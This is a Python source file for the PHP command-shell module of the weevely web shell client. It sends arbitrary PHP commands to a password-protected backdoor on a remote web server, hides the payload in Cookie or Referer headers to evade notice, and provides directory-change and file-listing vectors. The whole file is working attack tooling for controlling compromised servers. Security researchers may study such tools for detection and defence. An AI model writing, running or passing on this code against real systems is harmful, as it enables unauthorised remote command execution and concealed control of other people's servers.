'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.http.cmdrequest import CmdRequest, NoDataException
from core.parameters import ParametersList, Parameter as P

import random, os

classname = 'Php'
    
    
class Php(Module):
    '''Shell to execute PHP commands'''
    
    params = ParametersList('PHP command shell', [],
                             P(arg='cmd', help='PHP commands. Terminate with semi-comma', required=True, pos=0),
                             P(arg='mode', help='Obfuscation mode', choices = ['Cookie', 'Referer' ]),
                             P(arg='proxy', help='HTTP proxy')
                        )
    
#    available_modes = [ 'Cookie', 'Referer' ]
    
    def __init__(self, modhandler, url, password):
        
        self.cwd_vector = None
        self.path = None
        self.proxy = None
        
        self.current_mode = None
                    
        self.available_modes = self.params.get_parameter_choices('mode')
                    
        mode = self.params.get_parameter_value('mode')
        if mode:
            self.modes = [ mode ]
        else:
            self.modes = self.available_modes
        
        
        Module.__init__(self, modhandler, url, password)
        
        proxy = self.params.get_parameter_value('proxy')
        if proxy:
            self.mprint('[!] Proxies can break weevely requests, if possibile use proxychains')
            self.proxy = { 'http' : proxy }

        

    def _probe(self):
        
        for currentmode in self.modes:
            
            rand = str(random.randint( 11111, 99999 ))
            
            if self.run_module('echo %s;' % (rand)) == rand:
                self.current_mode = currentmode
                self.params.set_and_check_parameters({'mode' : currentmode}, False)
                break
        
        if not self.current_mode:
            raise ModuleException(self.name,  "PHP interpreter initialization failed")
        else:
            
            if self.run_module('is_callable("is_dir") && is_callable("chdir") && print(1);', False) != '1':
                self.mprint('[!] Error testing directory change methods, \'cd\' and \'ls\' will not work.')
            else:
                self.cwd_vector = "chdir('%s') && %s" 
                
       
    def run_module(self, cmd, use_current_path=True, post_data={}):


        if use_current_path and self.cwd_vector and self.path:
            cmd = self.cwd_vector % (self.path, cmd)
        
        request = CmdRequest( self.url, self.password, self.proxy)
        request.setPayload(cmd, self.current_mode)
        if post_data:
            request.setPostData(post_data)
    
        debug_level = 5
        self.mprint( "Request: %s" % (cmd), debug_level)
        
        
        try:
            resp = request.execute()
        except NoDataException, e:
            self.mprint( "Response: NoData", debug_level)
            pass
        except Exception, e:
            self.mprint('[!] Error requesting data: check URL or your internet connection.')
        else:
                    
            if  'error' in resp and 'eval()\'d code' in resp:
                self.mprint('[!] Invalid response \'%s\', skipping' % (cmd), debug_level)
            else:
                self.mprint( "Response: %s" % resp, debug_level)
                return resp
        

    def cwd_handler (self, path):
        
        response = self.run_module("is_dir('%s') && print(1);" % path, False)
        if response == '1':
            self.path = path
            return True
        return False
    
    def ls_handler (self, cmd):
        
        cmd_splitted = cmd.split()
        
        ls_vector = "$dir=@opendir('%s'); $a=array(); while(($f = readdir($dir))) { $a[]=$f; }; sort($a); print(join('\n', $a));"
        
        if len(cmd_splitted)==2:
            path = cmd_splitted[1]
        elif self.path:
            path = self.path
        else:
            path = '.'
            
            
        response = self.run_module( ls_vector % (path), False)
        if not response:
            self.mprint('[!] Error listing files in \'%s\', incorrect permission or safe mode enabled' % path)
            
        return response
            
    
    